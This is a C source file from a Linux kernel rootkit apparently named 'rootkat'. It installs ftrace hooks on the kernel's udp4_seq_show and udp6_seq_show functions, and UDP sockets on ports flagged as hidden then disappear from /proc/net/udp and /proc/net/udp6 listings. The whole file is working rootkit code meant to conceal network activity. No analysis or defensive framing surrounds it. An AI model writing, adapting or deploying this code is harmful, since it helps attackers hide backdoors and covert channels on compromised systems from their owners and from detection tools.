// SPDX-License-Identifier: MIT
#include <linux/kernel.h>
#include <linux/seq_file.h>
#include <net/sock.h>
#include "ftrace_hook.h"
#include "hidden_ports.h"
#include "hook_udp_seq_show.h"

#define TAG "rootkat/hook_udp_seq_show: "

/*
 * udp{4,6}_seq_show share an identical hook shape: `v` is either
 * SEQ_START_TOKEN or a struct sock *. sk->sk_num gives the local port
 * in host byte order regardless of family. Two hook structs because
 * they target different kernel symbols.
 */
typedef int (*udp_seq_show_t)(struct seq_file *seq, void *v);

static int rootkat_udp_seq_show_common(struct seq_file *seq, void *v,
                                       udp_seq_show_t orig)
{
	if (v != SEQ_START_TOKEN) {
		struct sock *sk = (struct sock *)v;

		if (rootkat_is_port_hidden(sk->sk_num))
			return 0;
	}
	return orig(seq, v);
}

/* --- IPv4 --- */

static const char * const udp4_seq_show_candidates[] = {
	"udp4_seq_show", NULL,
};

static int rootkat_udp4_seq_show(struct seq_file *seq, void *v);

static struct rootkat_hook hook_udp4_seq_show = {
	.candidates  = udp4_seq_show_candidates,
	.replacement = rootkat_udp4_seq_show,
};

static int rootkat_udp4_seq_show(struct seq_file *seq, void *v)
{
	return rootkat_udp_seq_show_common(seq, v,
		(udp_seq_show_t)hook_udp4_seq_show.original);
}

int rootkat_hook_udp4_seq_show_install(void)
{
	return rootkat_hook_install(&hook_udp4_seq_show);
}

void rootkat_hook_udp4_seq_show_remove(void)
{
	rootkat_hook_remove(&hook_udp4_seq_show);
}

/* --- IPv6 --- */

static const char * const udp6_seq_show_candidates[] = {
	"udp6_seq_show", NULL,
};

static int rootkat_udp6_seq_show(struct seq_file *seq, void *v);

static struct rootkat_hook hook_udp6_seq_show = {
	.candidates  = udp6_seq_show_candidates,
	.replacement = rootkat_udp6_seq_show,
};

static int rootkat_udp6_seq_show(struct seq_file *seq, void *v)
{
	return rootkat_udp_seq_show_common(seq, v,
		(udp_seq_show_t)hook_udp6_seq_show.original);
}

int rootkat_hook_udp6_seq_show_install(void)
{
	return rootkat_hook_install(&hook_udp6_seq_show);
}

void rootkat_hook_udp6_seq_show_remove(void)
{
	rootkat_hook_remove(&hook_udp6_seq_show);
}
